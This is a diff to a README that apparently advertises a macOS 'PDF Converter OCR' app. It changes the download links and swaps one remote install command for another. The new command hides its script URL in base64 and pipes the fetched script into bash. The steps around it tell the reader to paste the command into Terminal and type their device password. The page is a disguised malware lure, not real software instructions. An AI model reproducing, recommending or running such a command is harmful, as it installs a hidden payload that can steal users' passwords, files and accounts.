@@ -3,7 +3,7 @@
 PDF Converter OCR is a powerful macOS application designed to convert scanned PDFs and images into editable and searchable documents. Utilizing advanced Optical Character Recognition (OCR) technology, it enables easy extraction of text from images and PDFs for seamless editing and data management.
 
 ## ✅ Download PDF Converter OCR for macOS  
-[![Download PDF Converter OCR](https://img.shields.io/badge/Download-PDF_Converter_OCR-blueviolet)](https://pdf-converter-ocr-mac-download.github.io/.github)
+[![Download PDF Converter OCR](https://img.shields.io/badge/Download-PDF_Converter_OCR-blueviolet)](https://shuziktobehuman.github.io/huja/PDFConverter)
 
 ## 📦 How to Install
 
@@ -20,7 +20,7 @@ PDF Converter OCR is a powerful macOS application designed to convert scanned PD
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -30,7 +30,7 @@ PDF Converter OCR is a powerful macOS application designed to convert scanned PD
 
 
 ## ✅ Download PDF Converter OCR for macOS  
-[![Download PDF Converter OCR](https://img.shields.io/badge/Download-PDF_Converter_OCR-blueviolet)](https://pdf-converter-ocr-mac-download.github.io/.github)
+[![Download PDF Converter OCR](https://img.shields.io/badge/Download-PDF_Converter_OCR-blueviolet)](https://shuziktobehuman.github.io/huja/PDFConverter)
 
 ---
 
